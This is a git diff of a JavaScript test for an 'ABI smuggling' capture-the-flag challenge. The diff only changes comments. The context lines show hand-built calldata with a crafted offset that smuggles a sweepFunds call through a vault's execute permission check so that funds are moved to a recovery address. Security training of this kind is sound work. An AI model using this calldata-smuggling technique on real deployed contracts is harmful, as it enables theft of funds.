@@ -85,11 +85,12 @@ describe('[Challenge] ABI smuggling', function () {
 
         const executeFs = vault.interface.getSighash("execute")
         const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
-        // Modified offset to be 4 * 32 bytes from after the funcsig
+        // Modified offset to be 4 * 32 bytes from after the function selector
         const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); 
         const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);
         // Length of actionData calldata (1 * 4) + (2 * 32) Bytes
         const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
+        // actionData actual data: FS + address + address
         const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
         const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
                      + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
